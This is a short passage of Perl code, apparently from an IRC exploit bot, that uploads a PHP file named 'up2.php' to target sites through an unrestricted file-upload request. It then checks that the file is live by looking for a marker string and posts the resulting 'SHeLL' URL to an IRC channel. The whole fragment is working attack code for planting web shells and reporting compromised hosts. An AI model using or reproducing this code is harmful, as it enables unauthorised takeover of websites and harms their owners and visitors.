my $site   = $_[2];
my $engine = $_[3];
my $file = "up2.php";
my $exploit = $ua->post("$url",'folder' => "/",['Filedata' => ["$file"]]);
	my $status  = $exploit->as_string;
	my $check = &get_content("http://".$site."up2.php");
	if ($check =~ /Kan7ut/) {
	&msg("$chan","$purelogo(4@3$engine15)15(4@13SHeLL215)13 http://".$site."up2.php 9(4@15MildNet9) ");sleep(2);
